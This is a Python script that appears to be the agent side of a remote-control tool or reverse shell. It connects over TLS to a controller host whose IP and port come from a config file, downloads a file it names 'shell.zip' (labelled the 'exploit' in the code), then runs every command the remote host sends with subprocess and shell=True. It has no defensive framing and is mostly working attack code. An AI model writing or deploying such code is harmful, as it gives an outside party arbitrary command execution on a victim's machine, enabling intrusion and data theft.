import sys
import socket
import ssl
import subprocess
import json


def get_json_data(json_file):
    return json.load(open(json_file))


def echo_get_exploit(s):
    # accum for breaking the reception of the exploit
    a = 0
    with open('shell.zip', 'wb') as f:
        print ('file opened')
        while True:
            print('receiving data...')
            data = s.recv(8192)
            if not data:
                break
            # write data to a file
            f.write(data)
            a += 1
            if a == 6:
                break
    echo_client(s)


def echo_client(s):
    while True:
        data = s.recv(8192)
        print(data.decode("utf-8"))
        response = subprocess.check_output(data, shell=True)
        print(response)
        if data == b'':
            break
        s.send(b'This is a response.')
    print('Connection closed')
    s.close()


def main():
    config_data = get_json_data('config_w.json')

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Require a certificate from the server. We used a self-signed certificate
        # so here ca_certs must be the server certificate itself.
        ssl_sock = ssl.wrap_socket(s,cert_reqs=ssl.CERT_REQUIRED, ca_certs='cert')
        ssl_sock.connect((config_data['ip'], config_data['port']))
        echo_get_exploit(ssl_sock)
        ssl_sock.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
            sys.exit(2)
